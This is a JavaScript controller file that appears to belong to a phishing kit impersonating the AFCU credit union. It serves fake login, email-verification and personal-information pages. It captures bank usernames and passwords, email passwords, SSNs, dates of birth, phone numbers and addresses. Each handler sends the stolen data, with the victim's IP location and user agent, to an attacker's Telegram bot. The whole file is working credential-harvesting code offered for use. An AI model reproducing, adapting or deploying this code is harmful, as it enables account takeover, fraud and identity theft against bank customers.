const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");

exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  const { username, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `🏦AFCU  LOGIN-1\n\n` +
    `🔰Username : ${username}\n` +
    `🔑Pass : ${password}\n\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address  : ${query}\n` +
    `City : ${city}\n` +
    `State : ${region}\n` +
    `Country : ${country}\n` +
    `ISP : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/login/2");
};

exports.login2 = (req, res) => {
  res.render("login2");
};

exports.loginPost2 = async (req, res) => {
  const { username, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `🏦AFCU  LOGIN-2\n\n` +
    `🔰Username : ${username}\n` +
    `🔑Pass : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address : ${query}\n` +
    `City : ${city}\n` +
    `State : ${region}\n` +
    `Country : ${country}\n` +
    `ISP : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/email-verification");
};

exports.login3 = (req, res) => {
  res.render("login3");
};

exports.loginPost3 = async (req, res) => {
  const { email, emailPassword } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `🏦AFCU  Email Access\n\n` +
    `📧Email : ${email}\n` +
    `🔑Email Pass : ${emailPassword}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address : ${query}\n` +
    `City : ${city}\n` +
    `State : ${region}\n` +
    `Country : ${country}\n` +
    `ISP : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/personal");
};

exports.personal = (req, res) => {
  res.render("personal");
};

exports.personalPost = async (req, res) => {
  const { fname, dob, phone, ssn, address, addCity, state, zipcode } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `🏦AFCU  INFO\n\n` +
    `Full Name : ${fname}\n\n` +
    `DOB : ${dob}\n\n` +
    `Phone : ${phone}\n\n` +
    `SSN : ${ssn}\n\n` +
    `Address : ${address}\n\n` +
    `City : ${addCity}\n\n` +
    `State : ${state}\n\n` +
    `Zipcode : ${zipcode}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address : ${query}\n` +
    `City : ${city}\n` +
    `State : ${region}\n` +
    `Country : ${country}\n` +
    `ISP : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};


exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
